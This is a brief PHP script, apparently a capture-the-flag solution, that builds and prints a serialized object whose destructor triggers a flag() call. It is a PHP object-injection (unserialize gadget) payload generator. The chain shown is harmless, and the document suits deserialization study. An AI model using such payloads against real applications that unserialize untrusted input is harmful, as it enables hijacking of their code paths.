<?php
    class aaaaaa {
      public function flag() {
        $this->aa();
      }
      public function aa() {
        echo "Everything is OK!\n";
      }
    }
    class aaaa extends aaaaaa {
      public $aaa = 23;
      public function aa() {
      }
    }
    class aaaaaaa {
      /* Added */
      var $aaaaa;
      public function __construct() {
        $this->aaaaa = new aaaa();
        $this->aaaaa->aaa = 0;
      }
      /*  */
      public function __destruct(){
        $this->aaaaa->flag();
      }
    }
    echo serialize(new aaaaaaa());
?>
